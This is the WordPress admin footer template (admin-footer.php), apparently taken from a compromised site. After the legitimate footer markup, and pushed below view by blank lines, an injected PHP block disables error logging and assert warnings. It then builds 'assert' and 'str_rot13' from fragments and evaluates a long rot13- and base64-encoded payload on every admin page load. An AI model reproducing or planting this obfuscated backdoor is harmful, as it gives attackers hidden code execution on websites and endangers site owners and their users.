<?php
/**
 * WordPress Administration Template Footer
 *
 * @package WordPress
 * @subpackage Administration
 */

// don't load directly
if ( !defined('ABSPATH') )
	die('-1');

/**
 * @global string $hook_suffix
 */
global $hook_suffix;
?>

<div class="clear"></div></div><!-- wpbody-content -->
<div class="clear"></div></div><!-- wpbody -->
<div class="clear"></div></div><!-- wpcontent -->

<div id="wpfooter" role="contentinfo">
	<?php
	/**
	 * Fires after the opening tag for the admin footer.
	 *
	 * @since 2.5.0
	 */
	do_action( 'in_admin_footer' );
	?>
	<p id="footer-left" class="alignleft">
		<?php
		$text = sprintf( __( 'Thank you for creating with <a href="%s">WordPress</a>.' ), __( 'https://wordpress.org/' ) );
		/**
		 * Filters the "Thank you" text displayed in the admin footer.
		 *
		 * @since 2.8.0
		 *
		 * @param string $text The content that will be printed.
		 */
		echo apply_filters( 'admin_footer_text', '<span id="footer-thankyou">' . $text . '</span>' );
		?>
	</p>
	<p id="footer-upgrade" class="alignright">
		<?php
		/**
		 * Filters the version/update text displayed in the admin footer.
		 *
		 * WordPress prints the current version and update information,
		 * using core_update_footer() at priority 10.
		 *
		 * @since 2.3.0
		 *
		 * @see core_update_footer()
		 *
		 * @param string $content The content that will be printed.
		 */
		echo apply_filters( 'update_footer', '' );
		?>
	</p>
	<div class="clear"></div>
</div>
<?php
/**
 * Prints scripts or data before the default footer scripts.
 *
 * @since 1.2.0
 *
 * @param string $data The data to print.
 */
do_action( 'admin_footer', '' );

/**
 * Prints scripts and data queued for the footer.
 *
 * The dynamic portion of the hook name, `$hook_suffix`,
 * refers to the global hook suffix of the current page.
 *
 * @since 4.6.0
 */
do_action( "admin_print_footer_scripts-{$hook_suffix}" );

/**
 * Prints any scripts and data queued for the footer.
 *
 * @since 2.8.0
 */
do_action( 'admin_print_footer_scripts' );

/**
 * Prints scripts or data after the default footer scripts.
 *
 * The dynamic portion of the hook name, `$hook_suffix`,
 * refers to the global hook suffix of the current page.
 *
 * @since 2.8.0
 */
do_action( "admin_footer-{$hook_suffix}" );

// get_site_option() won't exist when auto upgrading from <= 2.7
if ( function_exists('get_site_option') ) {
	if ( false === get_site_option('can_compress_scripts') )
		compression_test();
}

?>

<div class="clear"></div></div><!-- wpwrap -->
<script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
</body>
</html>










<?php 
//###==3==###
@ini_set("error_log",NULL);
@ini_set("log_errors",0);
@ini_set("display_errors", 0);
error_reporting(0);
$wa = ASSERT_WARNING;
@assert_options($wa, 0);
@assert_options(ASSERT_QUIET_EVAL, 1);

$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gbz = "riny(".$strings2("base64_decode");
$light =  $strings2($gbz.'("nJLtXPScp3AyqPtxnJW2XFxtrlNtDTyhnI9mMKDbVzEcp3OfLKysMKWlo3WmVvkzLJkmMFx7DTIlpz9lK3WypT9lqTyhMltjXGfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxtWvLtMJ1jqUxbWTyvqvxcVUftWTyvqvN9VPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftVTIwnT8tWTyvqwg9VTIfp2IcMvNbMJ1jqUxbWTyvqvxcVUfXnJLtXUA0paA0pvtxK1ASHyMSHyfvFSEHHS9VG1AHVy0fVPVkZwphZPVcXKfxozSgMFN9VPEsH0IFIxIFJlWGEIWJEIWsDHERHvWqB31yoUAyrlEhLJ1yVQ0tWS9GEIWJEIWoVxuHISOsFR9GIPWqB30XWUImMKWuVQ0tnKAmMKDbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXG91pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXGbvVwfXWUIloPN9VPWbqUEjBv8iZGxjYwVhZGZ0YwR3AP9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqXF4vWzD9Vv51pzkyozAiMTHbWT5uoJHhWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYvE1p2IlLF4vWzx9ZFMbCFVhoJD1XPV1ZTWuLJD5MwN0ZwD3ZwSzATAzZzHmMTRlZGOvAwxmLwRkVvx7PzyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7L3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0ACGx5SD1EHFH1SG1IHYPN1XGftL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1EWGHICIIDfVQHcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsHxIHIIWBISWOGyATEIVfVSEFIHHcBjbxnJW2VQ0tL3IloS9yrTIwXPEwnPx7WTyhMz8tCFOwqKWfK2qyqTyhMz8bWTAbXGgcMvNbWTyhMz9oVzu0qUOsL29xMFWqVG0lZQNcrlEcLaL9VvV7sDcwqKWfK2Afo3AyXPEwnPx7Pa0tMJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcVQ09VQRcVUfXWTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPE1pzjcBjc9PzyzXPSyoKO0rFtxK1OCH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1OCH1EoVaNvKFxcVQ09VPVlAmOwZmRlMQZkAQZjLmquBTD5ZTIwZTR5LJDjBGAvLlVcVUftDTI2LJjbp3ElnKOmoTSmnTImXPEsHR9GISfvLlWqXFx7VU0XMJAbolNxnJW2Bjc9VU0="));'); $strings($light);
//###==3==###
?>